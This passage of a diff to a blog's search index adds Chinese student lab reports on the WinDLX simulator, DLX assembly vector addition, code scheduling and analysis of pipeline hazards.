@@ -598,7 +598,7 @@
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><p>期中考试终于都结束了！！有时间写东西啦～</p>
 <span id="more"></span>
 
-    <div id="aplayer-yGwaynGR" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="002X3RjI43O8qj" data-server="tencent" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div>
+    <div id="aplayer-pwzXLpfD" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="002X3RjI43O8qj" data-server="tencent" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div>
 <p>分数都还可以，至少都及格了，当然还可以做到更好，这得靠接下来的努力了～</p>
 <p>不过，我这些同学，还得往上带一带…… 毕竟作为学委的我还是见识到了不少让人抓狂的情况的…… 跟这里我吐槽一下，作业交得晚、借作业去抄… 都是常事。当然，也有很努力在学习的同学，他们会找我问题，我也会很乐意给出解答，这给我一次运用知识的机会，也增强了我和同学们的交流。对了，借这个当学委的机会我也几乎把全班同学认全了，哦耶！</p>
 <p>上周五听说要搬宿舍了，据说原因是另一个校区一整个院的同学都搬了过来，需要腾出一个楼来给其中的女生住，调整方案是说我现在所在楼 - 5 楼的同学要搬到 3 楼去，而 3 楼的女生要搬过来和要住进来的女生并一个楼。如果不出意外的话，这就是我的坐标处于 S5-535 的最后几天了，没想到我之前曾经说过要去 S3 看一看的愿望竟然这么快就实现了 hhh，但是我这么多东西该怎么搬啊……</p>
@@ -2291,6 +2291,273 @@
       </tags>
   </entry>
   <entry>
+    <title>WinDLX 模拟器安装与使用</title>
+    <url>/2022/10/15/experiments/jizu/installing-and-using-windlx/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="实验目的">实验目的</h2>
+<p>建立实验环境，了解 WINDLX 模拟器的结构及使用。</p>
+<h2 id="实验原理">实验原理</h2>
+<p>WinDLX 软件包中带有说明文件，供安装程序时候使用。</p>
+<h2 id="实验步骤">实验步骤</h2>
+<h3 id="安装WinDLX">安装 WinDLX</h3>
+<p>由于 WinDLX 是一个非常古老的模拟软件，但是我们现在多用 Win10 和 Win11 系统，所以需要使用虚拟机运行该软件。Win11 可以使用 Hyper-V 虚拟化运行方案，其界面如下所示：</p>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_qFbv2Qa_D3.png" class="" title="Hyper-V管理器主界面">
+<p>具体启用支持的方法在这里不多说了，之后可以像 VMware 虚拟机一样，添加一个 Windows XP 的系统镜像，并等待虚拟机上操作系统安装的流程走完，即可开始使用。</p>
+<div class="note info"><p>Hyper-V 无法像 VMware 虚拟机那样直接将文件拖入窗口来复制，但可以先将需要用到的文件制作成 vhd 虚拟硬盘，然后再加载硬盘。</p>
+</div>
+<p>所给定的 WinDLX 文件夹如下所示，我们可以直接双击 WinDLX.exe 来启动软件。</p>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_sPpeg0VgHi.png" class="">
+<h3 id="熟悉使用界面">熟悉使用界面</h3>
+<p>启动软件过后，可以看到一个窗口和六个子窗口，子窗口的名称分别为 Clock Cycle Diagram、Statistics、Breakpoints、Register、Code 和 Pipeline，双击这些子窗口或单击其上方的还原键即可看到子窗口的内容。</p>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_KxjgEY9_X1.png" class="">
+<p>要初始化模拟器，可以点击 File 菜单中的 Reset all 菜单项，弹出一个 “Reset DLX” 对话框。然后点击窗口中的 “确认” 按钮即可。</p>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_YEchSWiXz5.png" class="">
+<p>要载入文件或代码，需要点击 File 菜单的 Load Code or Data，在以下对话框中，依次选择 Fact.s 和 Input.s 文件，完成后单击 Load，将它们加载到主存中。</p>
+<div class="note warning"><p>注意：要先选择 fact.s 再选择 input.s 文件。程序在内存中出现的顺序很重要。</p>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_XfmJxGPgJb.png" class="">
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_jU6xYnVOwT.png" class="" title="现在，单击Load按钮将它们加载到主存中"></div>
+<p>成功加载文件后，会提示你重置 DLX，单击 “是”。这样，文件就已经装入到存储器中了。</p>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_zGYcGmsMFa.png" class="">
+<p>结合装载的文件，来介绍一下六大窗口的主要功能</p>
+<h4 id="Code-代码窗口">Code 代码窗口</h4>
+<p>在 Code 窗口中，我们能够看到代表存储器内容的三栏信息，从左到右依次为：地址 (符号或数字)、命令的十六进制机器代码和汇编命令。</p>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_N5Tfs32zDs.png" class="">
+<p>单击 WinDLX 窗口的 Execute（执行）按钮可以执行装入的程序，可以选择单步执行（Single Cycle，快捷键 F7）或多步执行（Multi Cycles，快捷键 F8）。当单步执行时，也有流水段颜色的区分（IF、ID、intEX、MEM 和 WB）</p>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_OAHMDNAJGN.png" class="">
+<p>如果需要多步执行，就在这个对话框中输入要执行的流水数目即可。</p>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_1Zzwpmaorh.png" class="">
+<h4 id="Pipeline流水线窗口">Pipeline 流水线窗口</h4>
+<p>流水线窗口主要显示了 DLX 处理器的内部结构，窗口下标识了 DLX 处理器的五个流水段和浮点操作（加 / 减、乘和除）的单元。</p>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_bphLLi5PTe.png" class="">
+<p>在运行指令时，将 Pipeline 窗口放大，即可看到当前与 Code 中所处的时刻相同的指令流水，可以清晰看到不同流水段执行的是哪条指令。</p>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_ar42V_rtMT.png" class="">
+<h4 id="Clock-Circle-Diagram时钟周期图窗口">Clock Circle Diagram 时钟周期图窗口</h4>
+<p>Clock Cycle Diagram 窗口主要显示了运行代码时流水线的时空图，时空图反映的是不同时隙内的运行情况。</p>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_mC0USoVaqr.png" class="">
+<p>在非空转代码的时候，显示如下：</p>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_bYqORtx7CN.png" class="">
+<p>任意双击指令的一行，可以详细看到不同流水段的情况，如下图所示。</p>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_ijbidVFTvq.png" class="">
+<h4 id="Register寄存器窗口">Register 寄存器窗口</h4>
+<p>Register 窗口会显示各个寄存器中的内容。</p>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_oSJhNz14hV.png" class="">
+<h4 id="Statistic统计数据窗口">Statistic 统计数据窗口</h4>
+<p>Statistics 窗口提供对运行程序中任何数据的分析，主要包括模拟器中硬件配置的情况。</p>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_ph76EvKYO5.png" class="">
+<p>这里包含：</p>
+<ol>
+<li>整体指令执行情况<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_RVWe28mDgc.png" class="">
+</li>
+<li>硬件配置情况<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_341IwOGYJ5.png" class="">
+</li>
+<li>暂停次数、百分比和原因分析<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_8KxD3jZ_MV.png" class="">
+</li>
+<li>分支次数和百分比<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_JHGpyQ6kXB.png" class="">
+</li>
+<li>Load/Store 指令执行情况<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_4o7Y5cy8hA.png" class="">
+</li>
+<li>浮点指令执行次数和百分比<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_di1vmW6RNZ.png" class="">
+</li>
+<li>trap 发生次数和百分比<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_A9oR1nMPWT.png" class="">
+</li>
+</ol>
+<h4 id="Breakpoints断点窗口">Breakpoints 断点窗口</h4>
+<p>该窗口主要用来观察代码运行的情况。使用前，需要打开 Breakpoints 窗口（首先需要激活 Breakpoints 小窗口才会出现 Breakpoints 菜单项）来设置 breakpoint，这个值代表了指令运行到流水线的哪个阶段就暂停运行。</p>
+<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_5qA1KGdijo.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_sM6iUTJGxM.png" class=""></div><div class="group-picture-column"><img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_cgfKBRYSZU.png" class="" title="从菜单中选择Set后，出现Set Breakpoint窗口"></div></div></div>
+<p>如果选择了 ID 阶段，在 Code 窗口相应行会出现 BID，表示程序执行到取指令 IF 结束译码 ID 开始的时候，程序将中止。</p>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_XrK7jIlqPf.png" class="" title="此时，Breakpoints窗口的显示为地址、中止阶段和当前指令">
+<p>WinDLX 可以在多种配置下工作。可以改变流水线的结构和时间要求、存储器大小和其他几个控制模拟的参数。均在 Configuration 菜单中完成配置。</p>
+<h5 id="Floating-Point-Stages配置窗口">Floating Point Stages 配置窗口</h5>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image_T_5pLEA9Z3.png" class="">
+<p>可以设置加法、乘法和触发的单元数目和延迟。</p>
+<h5 id="Memory-Size配置窗口">Memory Size 配置窗口</h5>
+<img data-src="/2022/10/15/experiments/jizu/installing-and-using-windlx/image__EPQPVWZ6k.png" class="">
+<p>可以设置存储空间的大小。</p>
+<h5 id="其他配置窗口">其他配置窗口</h5>
+<p>Configuration 菜单中的还有其他三种配置，它们是：Symbolic addresses、Absolute Cycle Count 和 Enable Forwarding。点击相应菜单项后，在它的旁边将显示一个小钩。</p>
+<ul>
+<li>最重要的配置项为 Enable Forwarding，指的是启用定向技术，定向技术是指将某个计算结果从其产生的地方直接送到其它指令需要它的地方，可以减少数据冲突引起的停顿。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>实验</category>
+        <category>计算机组成原理</category>
+      </categories>
+      <tags>
+        <tag>WinDLX</tag>
+        <tag>计算机组成原理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>代码优化</title>
+    <url>/2022/10/24/experiments/jizu/optimize/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="实验目的">实验目的</h2>
+<p>学习简单编译优化方法，观察采用编译优化方法所带来的性能的提高。</p>
+<h2 id="实验原理">实验原理</h2>
+<p>采用静态调度方法重排指令序列，减少相关，优化程序。</p>
+<h2 id="实验步骤">实验步骤</h2>
+<h3 id="用静态调度算法手工优化代码">用静态调度算法手工优化代码</h3>
+<p>选择上一个实验的两双精度浮点一维向量的加法运算代码作为优化对象，优化后的代码如下所示：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">.data</span><br><span class="line">VecLen: .word 16</span><br><span class="line">Vector1: .double 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16</span><br><span class="line">; vec1=[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]</span><br><span class="line">Vector2: .double 2,4,6,8,10,12,14,16,18,20,22,24,26,28,30,32</span><br><span class="line">; vec2=[2,4,6,8,10,12,14,16,18,20,22,24,26,28,30,32]</span><br><span class="line">; 声明向量长度以及两个向量1、2</span><br><span class="line">Printf1: .asciiz "The result is\n"</span><br><span class="line">Printf2: .asciiz "%f\t"</span><br><span class="line"></span><br><span class="line">.align 2</span><br><span class="line"></span><br><span class="line">PrintfHead: .word Printf1</span><br><span class="line">PrintfValue: .word Printf2</span><br><span class="line">result: .space 8</span><br><span class="line">; 打印数据空间的申请</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">addi r14,r0,PrintfHead</span><br><span class="line">trap 5</span><br><span class="line">addi r2,r0,0</span><br><span class="line">lw r20,VecLen</span><br><span class="line">;addi r2,r0,0</span><br><span class="line"></span><br><span class="line">loop: ; 循环读入向量</span><br><span class="line">ld f0,Vector1(r2)</span><br><span class="line">ld f2,Vector2(r2)</span><br><span class="line">; 插入指令，避免f2的RAW</span><br><span class="line">addi r2,r2,8</span><br><span class="line">subi r20,r20,1</span><br><span class="line"></span><br><span class="line">addd f4,f0,f2</span><br><span class="line">; 主要的加法运算</span><br><span class="line">sd result,f4</span><br><span class="line">addi r14,r0,PrintfValue</span><br><span class="line">trap 5</span><br><span class="line">;addi r2,r2,8</span><br><span class="line">;subi r20,r20,1 提前到了前面</span><br><span class="line">bnez r20,loop</span><br><span class="line"></span><br><span class="line">trap 0</span><br><span class="line">; 系统中断，输出结果 "The result is 3.000000, 6.000000, ...."</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="分析已优化程序中出现的数据-控制-结构相关">分析已优化程序中出现的数据 / 控制 / 结构相关</h3>
+<div class="tabs" id="res1"><ul class="nav-tabs"><li class="tab active"><a href="#res1-1">优化前</a></li><li class="tab"><a href="#res1-2">优化后</a></li></ul><div class="tab-content"><div class="tab-pane active" id="res1-1"><p><img data-src="image_czojEXSniG.png" alt="优化前程序" title="优化前程序"></p></div><div class="tab-pane" id="res1-2"><p><img data-src="image__c0vohBdpb.png" alt="优化后程序" title="优化后程序"></p></div></div></div>
+<p>优化后的程序的时钟周期从 267 个减少到了 235 个，RAW 相关也从 48 个大大减少到了 16 个，控制相关和结构相关的数量没有改变，由此可见本次所作代码优化对数据相关的改善最大。</p>
+<h3 id="考虑增加浮点运算部件对于性能的影响">考虑增加浮点运算部件对于性能的影响</h3>
+<div class="tabs" id="res2"><ul class="nav-tabs"><li class="tab active"><a href="#res2-1">1 个浮点部件</a></li><li class="tab"><a href="#res2-2">4 个浮点部件</a></li></ul><div class="tab-content"><div class="tab-pane active" id="res2-1"><p><img data-src="image_Da5MgPENTq.png" alt="1个浮点部件" title="1个浮点部件"></p>
+<p><img data-src="image_B7x4cW0ajI.png" alt="1个浮点部件（图2）" title="1个浮点部件（图2）"></p></div><div class="tab-pane" id="res2-2"><p><img data-src="image_G26kibZeDp.png" alt="4个浮点部件" title="4个浮点部件"></p>
+<p><img data-src="image_HpO1C90ynd.png" alt="4个浮点部件（图2）" title="4个浮点部件（图2）"></p></div></div></div>
+<p>同一段代码执行相同步，但是经过对比发现浮点运算部件的增减对于程序执行效率没有影响，可能是因为程序中不存在结构相关，所以并行度没有增加，系统性能没有提升。</p>
+<h3 id="考虑增加forward部件对性能的影响">考虑增加 forward 部件对性能的影响</h3>
+<div class="tabs" id="res3"><ul class="nav-tabs"><li class="tab active"><a href="#res3-1">使用 Forward 组件</a></li><li class="tab"><a href="#res3-2">不使用 Forward 组件</a></li></ul><div class="tab-content"><div class="tab-pane active" id="res3-1"><p><img data-src="image_ksxwWa7qjZ.png" alt="使用Forward组件" title="使用Forward组件"></p></div><div class="tab-pane" id="res3-2"><p><img data-src="image_9ROBHMR9xL.png" alt="禁用Forward组件" title="禁用Forward组件"></p></div></div></div>
+<p>使用 forward 组件后，执行的 cycles 比不适用 forward 组件要少，且产生的 RAW stalls 有明显减少，程序执行的效率提高了很多。在代码优化前，RAW 相关占 48 个 stalls，在优化后，RAW 现象大量减少，数据相关明显改善，提高了代码执行效率。</p>
+<h3 id="观察转移指令在转移成功和转移不成功时的流水线开销">观察转移指令在转移成功和转移不成功时的流水线开销</h3>
+<p><img data-src="image_55nB__dTOL.png" alt="Conditional Branches 输出" title="Conditional Branches 输出"></p>
+<p>本次实验中，转移成功的几率比较大。由于系统按照预测成功来执行指令，当判断转移不成功时，系统对 trap 指令进行的操作全部作废，转而去执行别的指令。这里代码优化对于转移指令没有影响。</p>
+]]></content>
+      <categories>
+        <category>实验</category>
+        <category>计算机组成原理</category>
+      </categories>
+      <tags>
+        <tag>WinDLX</tag>
+        <tag>计算机组成原理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DLX 处理器程序设计</title>
+    <url>/2022/10/24/experiments/jizu/programming/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="实验目的">实验目的</h2>
+<p>学习使用 DLX 汇编语言编程，进一步分析相关现象</p>
+<h2 id="实验原理">实验原理</h2>
+<p>掌握向量运算算法和编程方法。由于操作数为双精度，需要使用操作浮点双精度的指令。</p>
+<p>本次使用到的指令为</p>
+<ul>
+<li>ADDD 浮点加指令，其命令格式为 <code>rd,rs1,rs2</code>，rs1 和 rs2 将加到 rd 上。</li>
+<li>ADDI 立即数加指令，其命令格式为 <code>rd,rs1,immediate</code>，rs1 和一个立即数将加到 rd 上。</li>
+<li>SD 存储浮点数指令，其命令格式为 <code>offset(rs1),rd</code>，将 rs1 对应空间的数存储在 rd 上。</li>
+<li>LD 读取浮点数指令，其命令格式为 <code>rd,offset(rs1)</code>，将 rs1 对应空间的数取到 rd 上。</li>
+<li>BNEZ 判断指令，其命令格式为 <code>rs1,name</code>，如果 CPR 寄存器不为零，则继续执行 name 部分。</li>
+</ul>
+<h2 id="实验步骤">实验步骤</h2>
+<ol>
+<li>
+<p>自编一段汇编代码，完成两双精度浮点一维向量的加法（或乘除法）运算，并输出结果。向量长度 &gt;=16。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">.data</span><br><span class="line">VecLen: .word 16</span><br><span class="line">Vector1: .double 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16</span><br><span class="line">; vec1=[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]</span><br><span class="line">Vector2: .double 2,4,6,8,10,12,14,16,18,20,22,24,26,28,30,32</span><br><span class="line">; vec2=[2,4,6,8,10,12,14,16,18,20,22,24,26,28,30,32]</span><br><span class="line">; 声明向量长度以及两个向量1、2</span><br><span class="line">Printf1: .asciiz "The result is\n"</span><br><span class="line">Printf2: .asciiz "%f\t"</span><br><span class="line"></span><br><span class="line">.align 2</span><br><span class="line"></span><br><span class="line">PrintfHead: .word Printf1</span><br><span class="line">PrintfValue: .word Printf2</span><br><span class="line">result: .space 8</span><br><span class="line">; 打印数据空间的申请</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">addi r14,r0,PrintfHead</span><br><span class="line">trap 5</span><br><span class="line">lw r20,VecLen</span><br><span class="line">addi r2,r0,0</span><br><span class="line"></span><br><span class="line">loop: ; 循环读入向量</span><br><span class="line">ld f0,Vector1(r2)</span><br><span class="line">ld f2,Vector2(r2)</span><br><span class="line">addd f4,f0,f2</span><br><span class="line">; 主要的加法运算</span><br><span class="line">sd result,f4</span><br><span class="line">addi r14,r0,PrintfValue</span><br><span class="line">trap 5</span><br><span class="line">addi r2,r2,8</span><br><span class="line">subi r20,r20,1</span><br><span class="line">bnez r20,loop</span><br><span class="line"></span><br><span class="line">trap 0</span><br><span class="line">; 系统中断，输出结果 "The result is 3.000000, 6.000000, ...."</span><br></pre></td></tr></tbody></table></figure>
+<p>程序，运行结果为下图</p>
+<img data-src="/2022/10/24/experiments/jizu/programming/image_phympq_63F.png" class="">
+<p>数据统计为下窗口所示：</p>
+<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="image_jmdoV6noOX.png" alt=""></div><div class="group-picture-column"><img data-src="image_nIrZXuh4OD.png" alt=""></div></div></div>
+</li>
+<li>
+<p>观察程序中出现的数据 / 控制 / 结构相关。</p>
+ <img data-src="/2022/10/24/experiments/jizu/programming/image_30Lxy8oMOz.png" class="">
+<p>数据相关：对当前指令的操作数寄存器进行操作（EX）的时候，前几条指令的运算结果还未写回（WB）结果寄存器，产生了数据相关。</p>
+<p>典型指令组合</p>
+ <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">subi r16,r16,0x1</span><br><span class="line">bnez r16,Loop</span><br></pre></td></tr></tbody></table></figure>
+<p>控制相关：由于系统按照预测成功来执行指令，所以执行 bnez 后会马上将其下一条指令 trap 读取进来</p>
+<p>典型指令组合：</p>
+ <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">bnez r20,Loop</span><br><span class="line">trap 0x0</span><br></pre></td></tr></tbody></table></figure>
+<p>程序中并没有出现结构相关。因为整体仅仅做了一次简单的加法。</p>
+</li>
+<li>
+<p>浮点运算部件带来的影响</p>
+<div class="tabs" id="floats"><ul class="nav-tabs"><li class="tab active"><a href="#floats-1">使用 1 个浮点加法器</a></li><li class="tab"><a href="#floats-2">使用 2 个浮点加法器</a></li></ul><div class="tab-content"><div class="tab-pane active" id="floats-1"><img data-src="/2022/10/24/experiments/jizu/programming/image_CHQj5DasyE.png" class=""></div><div class="tab-pane" id="floats-2"><img data-src="/2022/10/24/experiments/jizu/programming/image_mT6P512ORr.png" class=""></div></div></div>
+<p>增加浮点加法器的数量后，程序执行的性能并未得到提升。</p>
+</li>
+<li>
+<p>Forward 组件的影响</p>
+<div class="tabs" id="forwards"><ul class="nav-tabs"><li class="tab"><a href="#forwards-1">启用 Forward 组件</a></li><li class="tab active"><a href="#forwards-2">禁用 Forward 组件</a></li></ul><div class="tab-content"><div class="tab-pane" id="forwards-1"><img data-src="/2022/10/24/experiments/jizu/programming/image_uFBPKTACNp.png" class=""></div><div class="tab-pane active" id="forwards-2"><img data-src="/2022/10/24/experiments/jizu/programming/image_4mnDTJDUV_.png" class=""></div></div></div>
+<p>关闭 Forward 后，运行时间由 267 个周期增加到 333 个周期，可计算 Forward 技术为该程序带来了 333/267=1.25 的加速比。且 Forward 技术明显减少了 RAW stalls，降低了数据相关的数量。</p>
+</li>
+<li>
+<p>转移指令的影响</p>
+<div class="tabs" id="transfer"><ul class="nav-tabs"><li class="tab"><a href="#transfer-1">转移成功</a></li><li class="tab"><a href="#transfer-2">转移失败</a></li></ul><div class="tab-content"><div class="tab-pane" id="transfer-1"><img data-src="/2022/10/24/experiments/jizu/programming/image_OWjDOo_wJ6.png" class=""></div><div class="tab-pane" id="transfer-2"><img data-src="/2022/10/24/experiments/jizu/programming/image_vaMruizC-Z.png" class=""></div></div></div>
+<p>成功时，已经进入取指阶段的指令会被放弃（aborted），转入转移的目标指令的取指操作，造成流水线断流；若转移失败，已经进入取指阶段的指令继续进入译码阶段，流水线不断流。</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>实验</category>
+        <category>计算机组成原理</category>
+      </categories>
+      <tags>
+        <tag>WinDLX</tag>
+        <tag>计算机组成原理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>指令流水线相关性分析</title>
+    <url>/2022/10/15/experiments/jizu/relation-analysis/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="实验目的">实验目的</h2>
+<p>通过使用 WINDLX 模拟器，对程序中的三种相关原理进行观察，并对使用专用通路，增加运算部件等技术对性能的影响进行考察，加深对流水线和 RISC 处理器的特点的理解。</p>
+<h2 id="实验原理">实验原理</h2>
+<p>指令流水线中主要有结构相关、数据相关、控制相关。相关影响流水线性能。</p>
+<h3 id="数据相关">数据相关</h3>
+<p>由于相邻的两条或多条指令使用了相同的数据地址而发生的关联。</p>
+<h3 id="结构相关">结构相关</h3>
+<p>结构相关是指因为程序的执行方向可能被改变而引起的相关。可能改变程序执行方向的指令通常有无条件转移、一般条件转移、复合条件转移、子程序调用、中断等。</p>
+<h3 id="控制相关">控制相关</h3>
+<p>控制相关是指由转移指令引发的相关。</p>
+<h2 id="实验步骤">实验步骤</h2>
+<div class="note info"><h4 id="实验准备">实验准备</h4>
+<p>将浮点运算的延时设为 4 个周期<br>
+<img data-src="/2022/10/15/experiments/jizu/relation-analysis/image_aXqazps9yb.png" class=""></p>
+</div>
+<p>选择 File→Load Code or Data，将 input.s 文件和 fact.s 文件按下图顺序装入主存</p>
+<img data-src="/2022/10/15/experiments/jizu/relation-analysis/image_6o0VQk_-Ji.png" class="">
+<p>使用 WinDLX 模拟器，对 Fact.s 做如下分析：</p>
+<h3 id="观察程序中出现的数据-控制-结构相关，指出程序中出现上述现象的指令组合">观察程序中出现的数据 / 控制 / 结构相关，指出程序中出现上述现象的指令组合</h3>
+<h4 id="数据相关及其组合">数据相关及其组合</h4>
+<p>5 个周期里，Clock Cycle Diagram 窗口的时空图和 Pipeline 窗口中的流图第一次出现了橘黄色的 R-Stall</p>
+<img data-src="/2022/10/15/experiments/jizu/relation-analysis/image_nALPeNEB9z.png" class="">
+<p>点击 <code>seqi r5,r3,0xa</code>，出现的具体信息如下图</p>
+<img data-src="/2022/10/15/experiments/jizu/relation-analysis/image_l4MCfQqj2b.png" class="">
+<p><code>lbu r3,0x0(r2)</code> 要在 WB 周期内写回 R3 的数据，而下一条指令 <code>seqi r5,r3,0xa</code> 要在 intEX 周期内读取 r3 的数据，发生了写后读 RAW，所以为了避免冲突，<code>seqi r5,r3,0xa</code> 的 <code>intEX</code> 指令延迟了一个周期进行。</p>
+<p>指令组合为</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">lbu r3,0x0(r2)</span><br><span class="line">seqi r5,r3,0xa</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="控制相关及其组合">控制相关及其组合</h4>
+<p>在第 4 个时钟周期，第一条命令处于 MEM 段，第二条命令处于 intEX 段，第四条命令处于 IF 段，而第三条命令显示为 aborted。</p>
+<img data-src="/2022/10/15/experiments/jizu/relation-analysis/image_QGI1hfUiiE.png" class="">
+<p>发生 aborted 的原因为，<code>jal InputUnsigned</code> 是无条件分支指令，但只有在第三个时钟周期，<code>jal</code> 指令被译码后才知道。这时，下一条指令 <code>movei2fp</code> 已经取出，但需执行的下一条指令在另一个地址处，因此，<code>movi2fp</code> 的执行应该被取消，在流水线中留下气泡，此处为控制相关。</p>
+<p>指令组合为</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">addi r1,r0,0x1000</span><br><span class="line">jal InputUnsigned</span><br><span class="line">movi2fp,f10,r1</span><br><span class="line">sw SaveR2(r0),r2</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="结构相关及其组合">结构相关及其组合</h4>
+<p>从 Clock Cycle Diagram 中，可以看出指令 stall 了 4 个周期</p>
+<img data-src="/2022/10/15/experiments/jizu/relation-analysis/image_JX5gYYzGzj.png" class="">
+<p><code>addi r2,r2,0x1</code> 与前面的一条指令 <code>add r1,r1,r3</code> 发生了结构相关。由于上一条指令数据相关需要停 4 个周期，在 ID 段停滞，不能进入 intEX 段，故 <code>addi r2,r2,0x1</code> 也不能进入 ID 段，译码部分被占用，故发生了结构相关。</p>
+<img data-src="/2022/10/15/experiments/jizu/relation-analysis/image_Zwun2HbC43.png" class="">
+<p>相关指令组合</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">add r1,r1,r3</span><br><span class="line">addi r2,r2,0x1</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="考察增加浮点运算部件对性能的影响">考察增加浮点运算部件对性能的影响</h3>
+<div class="tabs" id="results"><ul class="nav-tabs"><li class="tab active"><a href="#results-1">count=1</a></li><li class="tab"><a href="#results-2">count=2</a></li></ul><div class="tab-content"><div class="tab-pane active" id="results-1"><p>浮点运算部件的 Count 均为 1</p>
+<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="image_q0ciOGmpYn.png" alt=""></div><div class="group-picture-column"><img data-src="image_b9tWK4nJeR.png" alt=""></div></div></div></div><div class="tab-pane" id="results-2"><p>浮点运算部件的 Count 均为 2</p>
+<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="image_9uzcYEaJhk.png" alt=""></div><div class="group-picture-column"><img data-src="image_jD1hxscOAo.png" alt=""></div></div></div></div></div></div>
+<p>比较各个数据，发现没有变化，无论怎么增加统计结果都一样，由此可见，在该程序中，浮点运算部件的增减对效率没有影响。原因在于，此程序浮点计算指令没有重叠，所以并行度没有增加，性能没有提高。</p>
